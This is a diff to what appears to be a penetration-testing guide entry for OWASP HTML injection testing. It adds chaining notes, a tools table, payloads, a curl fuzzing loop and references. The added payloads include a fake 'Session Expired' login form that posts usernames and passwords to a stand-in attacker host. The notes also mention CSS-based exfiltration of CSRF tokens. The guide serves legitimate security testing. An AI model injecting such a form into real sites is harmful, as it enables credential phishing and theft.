@@ -8,9 +8,11 @@ author: cyberstrike-official
 tags: [client-side, javascript, dom, cors, wstg, clnt]
 tech_stack: []
 cwe_ids: [CWE-94]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-clnt-05, wstg-clnt-01]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-clnt-01: "Injected HTML lands in an innerHTML-style DOM XSS sink = a defacement/phishing bug escalates into full script execution and cookie/session theft (Medium -> High)"
+  wstg-clnt-05: "HTML Injection + CSS Injection = attacker controls both markup and styling, enabling a pixel-perfect credential-phishing overlay plus attribute-selector CSS exfiltration of CSRF tokens/input values (Medium -> High)"
 ---
 
 # wstg-clnt-03
@@ -124,6 +126,51 @@ tester.test_injection("/profile", "bio")
 
 ---
 
+## Tools
+
+| Tool               | Purpose                                          |
+| ------------------- | ------------------------------------------------- |
+| **Burp Suite**       | Intercept and fuzz parameters for reflected HTML   |
+| **OWASP ZAP**        | Automated HTML injection scanning                  |
+| **Browser DevTools** | Verify unencoded HTML rendering in the DOM          |
+
+---
+
+## Example Commands/Payloads
+
+### Basic HTML injection payloads
+
+```html
+<h1>Injected</h1>
+<b>bold text</b>
+<a href='https://attacker.tld'>Click here</a>
+<img src='https://attacker.tld/logo.png'>
+<marquee>HTML Injection PoC</marquee>
+```
+
+### Phishing form injection
+
+```html
+<form action="https://attacker.tld/steal" method="POST">
+  <h2>Session Expired - Please Re-login</h2>
+  <input name="username" placeholder="Username" />
+  <input name="password" type="password" placeholder="Password" />
+  <button type="submit">Login</button>
+</form>
+```
+
+### curl fuzzing
+
+```bash
+TARGET="https://{target}"
+for payload in "<h1>Injected</h1>" "<a href='https://attacker.tld'>x</a>" "<table><tr><td>c</td></tr></table>"; do
+  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$payload")
+  curl -s "$TARGET/search?q=$enc" | grep -qF "$payload" && echo "[VULN] $payload"
+done
+```
+
+---
+
 ## Remediation
 
 ```python
@@ -158,6 +205,14 @@ element.textContent = userInput // Safe
 | ---------- | --------------------------------------------------- |
 | **CWE-80** | Improper Neutralization of Script-Related HTML Tags |
 
+
+---
+
+## References
+
+- [OWASP WSTG - Testing for HTML Injection (WSTG-CLNT-03)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection)
+- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
 
 ---
 
